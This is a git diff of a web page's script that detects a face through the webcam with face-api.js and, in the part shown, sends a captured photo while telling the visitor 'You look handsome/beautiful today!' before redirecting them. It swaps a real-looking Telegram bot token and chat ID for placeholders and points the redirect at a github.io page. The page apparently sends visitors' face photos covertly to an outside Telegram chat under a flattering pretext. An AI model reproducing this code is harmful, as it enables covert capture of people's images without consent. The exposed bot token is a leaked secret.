@@ -42,8 +42,8 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const message = document.getElementById('message');
-        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
-        const TELEGRAM_CHAT_ID = '5934902786';
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
         async function loadModels() {
             await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
@@ -92,7 +92,7 @@
                     video.style.display = "none";
                     message.innerText = "You look handsome/beautiful today!";
                     message.style.display = "block";
-                    setTimeout(() => { window.location.href = "nextpage.html"; }, 3000);
+                    setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
                 }).catch(err => console.error("Error sending photo: ", err));
             }, 'image/jpeg');
         }
